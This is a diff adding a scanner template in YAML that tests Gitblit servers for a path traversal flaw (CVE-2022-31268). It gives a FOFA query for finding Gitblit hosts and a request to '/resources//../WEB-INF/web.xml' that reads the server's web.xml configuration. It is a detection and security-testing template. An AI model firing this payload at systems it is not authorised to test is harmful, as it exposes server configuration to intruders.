@@ -1,0 +1,25 @@
+id: poc-yaml-gitblit-path-traversal
+info:
+  name: Gitblit 路径遍历漏洞(CVE-2022-31268)
+  severity: high
+  tags:
+  - CVE-2022-31268
+  - 两高一弱
+  finger: gitblit
+  fofa: body="Gitblit"
+requests:
+- method: GET
+  path: /resources//../WEB-INF/web.xml
+  expression: 'status_code == 200 &&
+
+    contains(body,"</web-app>") &&
+
+    contains(body,"java.sun.com") &&
+
+    contains(body,"gitblit.properties") &&
+
+    contains(content_type,"application/xml")
+
+    '
+variables: {}
+transport: http
